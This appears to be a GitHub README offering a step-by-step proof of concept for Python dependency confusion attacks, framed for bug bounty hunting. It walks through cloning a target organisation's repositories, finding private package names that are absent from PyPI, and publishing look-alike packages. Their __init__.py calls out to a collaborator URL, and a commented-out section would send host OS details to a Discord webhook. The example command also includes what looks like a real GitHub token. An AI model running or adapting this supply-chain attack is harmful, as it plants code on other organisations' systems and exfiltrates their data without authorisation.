<h1 align="center">
    <a href="https://www.youtube.com/@techghoshal"><img src="https://github.com/techghoshal/Fix-Grub-Boot-Menu/assets/85815644/26ed3a3f-a1e6-452c-b2ac-cac5c3d7478e"></a>
<h1 align="center">Python Dependency Confusion Attacks POC
<p align="center"><img alt="Twitter Follow" src="https://img.shields.io/twitter/follow/techghoshal?style=social"></p>
</h1>


## How to Finds & How to Exploit

Finds requirement.txt then check the all dependency here is public or not

`https://pypi.org/project/pip/`

#### Download all target github repository
- Crate personal access tokens (classic):- https://github.com/settings/tokens
- Install ghorg - https://github.com/gabrie30/ghorg#installation
```bash
$ ghorg clone <target> -t <token>
```
`example: $ ghorg clone google -t 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`
    
- After Download all repository finds vulnerable python package
    
```bash 
$ find . -type f -name requirements.txt | xargs -n1 -I{} cat {} |  awk '{print $1;}' | tr -d '><~#$' | sort -u |  cut -d '=' -f 1 | awk '{print $1;}' | sed -r 's/[^[:space:]]*[0-9][^[:space:]]* ?//g' | sort -u | xargs -n1 -I{} echo "https://pypi.org/project/{}/" | httpx -status-code -silent -content-length -mc 404
```
- 404 code means this package not available publicly So This the vulnerable to dependencies confusion.

- So now Publish this python packages publicly (https://pypi.org)

```bash
$ mkdir <package-name>
```
```bash
$ cd <package-name>
```
```bash
$ mkdir <package-name> 
```
```bash
$ cd <package-name>
```
```bash
$ touch __init__.py 
```

```bash
# python package dependency confiuse vulnerability POC 
# name: techghoshal
# e-mail: techghoshal@gmail.com
# Impact this vulnerability: Remote code execution(RCE)


import request
#from discord import SyncWebhook
#import os

## canarytokens_url OR burp collaborator URL
requests.get("canarytokens_url")

## Send target system info to your discord server 
#webhook = SyncWebhook.from_url("<discord_webhook_url>")

#osname =  os.uname()
#cwd = os.getcwd()

#webhook.send(f"OS-Info: {osname}")
#webhook.send(f"Current-DIR: {cwd}")
```

- Save this file

```bash
$ cd .. 
```
```bash
$ touch setup.py
```
- Note: The version of package and the version of the vulnerable package must be same
    
```bash 
from setuptools import setup, find_packages
import codecs
import os

here = os.path.abspath(os.path.dirname(__file__))

with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
    long_description = "\n" + fh.read()

VERSION = '0.0.1'
DESCRIPTION = 'Dependency confiuse Attack'
LONG_DESCRIPTION = 'Python package dependency confiuse vulnerability POC. Impact this vulnerability is Remote code execution (RCE)'

# Setting up
setup(
    name="<package-name>",
    version=VERSION,
    author="<techghoshal>",
    author_email="<techghoshal@gmail.com>",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=long_description,
    packages=find_packages(),
    install_requires=['requests', 'discord'],
    keywords=[]
   )
```
- Save this file

```bash
$ touch README.md
```
```bash
<h1 align="center">This Python package vulnerable to dependency confusion vulnerability</h1>
```
- Save this file

- Next build package
```bash
$ python3 setup.py sdist bdist_wheel
```

- Upload file publicly (https://pypi.org)

- Create Accont on pypi.org

```bash
$ pip3 install twine
```
```bash
$ twine upload dist/*
```

- Enter your username: <username>
- Enter your password: <password>

---
    
Upload IS DONE 😎 
<br>
🎉 Now Bounty Time 💰💰
    
## Connect me
If you have any queries, you can always contact me on <a href="https://twitter.com/techghoshal">twitter(@techghoshal)</a>


